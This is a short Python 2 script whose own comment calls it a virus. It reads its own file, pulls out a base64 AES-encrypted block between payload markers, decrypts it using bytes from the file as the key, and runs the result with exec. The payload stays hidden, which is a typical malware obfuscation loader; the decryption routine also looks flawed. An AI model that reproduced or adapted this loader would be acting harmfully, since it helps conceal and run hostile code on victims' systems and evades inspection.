print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload